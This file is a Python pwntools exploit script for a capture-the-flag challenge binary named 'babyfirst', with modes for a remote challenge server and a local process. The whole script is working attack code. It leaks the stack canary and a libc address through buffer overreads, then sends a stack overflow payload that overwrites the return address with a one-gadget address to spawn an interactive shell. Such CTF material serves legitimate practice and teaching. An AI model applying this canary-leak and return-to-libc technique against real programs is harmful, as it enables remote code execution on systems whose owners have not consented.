#! /usr/bin/python2

from pwn import *
import sys


def exploit():
    gdb_command = '''
        breakrva 0xF2B
        c
    '''
    login('bdmin')
    login('a\x00')
    SIGN = 'THE_END'
    play('a' * (0x29 - len(SIGN)) + SIGN)
    r.recvuntil(SIGN)
    raw = r.recv(7)
    canary = u64(raw.rjust(8, '\x00'))
    log.info('Canary: ' + hex(canary))

    r.send('a' * (0x68 - len(SIGN)) + SIGN)
    r.recvuntil(SIGN)
    raw = r.recv(6)
    lib_start_main = u64(raw.ljust(8, '\x00')) - 231
    libc_addr = lib_start_main - 0x21ab0
    rce_addr = libc_addr + 0x10a38c
    log.info(hex(libc_addr))

    r.sendline('\x00' * 0x28 + p64(canary) * 2 + p64(rce_addr))
    # gdb.attach(r, gdb_command)
    r.sendline('END')
    r.interactive()


def login(username):
    r.sendlineafter('Your choice: ', '1')
    r.sendlineafter('User Name: ', username)


def play(content):
    r.sendlineafter('Your choice: ', '2')
    r.sendafter('Content: ', content)


if __name__ == '__main__':
    context.terminal = ['gnome-terminal', '-e']
    if len(sys.argv) == 1:
        exit()
    if sys.argv[1] == 'remote':
        r = remote('babyfirst.chung96vn.cf', 31337)
        LOCAL = False
    elif sys.argv[1] == 'local':
        r = process('./babyfirst')
        LOCAL = True
    else:
        exit()
    exploit()
